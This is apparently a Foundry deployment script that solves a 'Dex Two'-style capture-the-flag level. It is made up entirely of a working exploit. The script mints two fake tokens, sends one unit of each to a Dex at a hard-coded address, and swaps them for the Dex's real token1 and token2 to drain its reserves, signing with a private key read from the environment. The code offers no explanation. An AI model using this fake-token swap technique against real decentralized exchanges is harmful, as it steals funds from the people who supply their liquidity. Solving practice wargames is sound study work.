//SPDX-License-Identifier: MIT

pragma solidity 0.8.21;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {Dex, SwappableToken} from "../test/Dex2.sol";

contract DrainDex2Reserves is Script {
    function run() public {
        uint256 pk = vm.envUint("PK");

        vm.startBroadcast(pk);
        Dex dex = Dex(0xb9c4BC21634759fCAA451919ED2811400EBB916C);

        SwappableToken token3 = new SwappableToken(
            address(dex),
            "MToken3",
            "MTKN3",
            1e18
        );
        SwappableToken token4 = new SwappableToken(
            address(dex),
            "MToken4",
            "MTKN4",
            1e18
        );

        token3.transfer(address(dex), 1);
        token4.transfer(address(dex), 1);

        token3.approve(address(dex), 1);
        token4.approve(address(dex), 1);

        dex.swap(address(token3), dex.token1(), 1);
        dex.swap(address(token4), dex.token2(), 1);

        vm.stopBroadcast();
    }
}
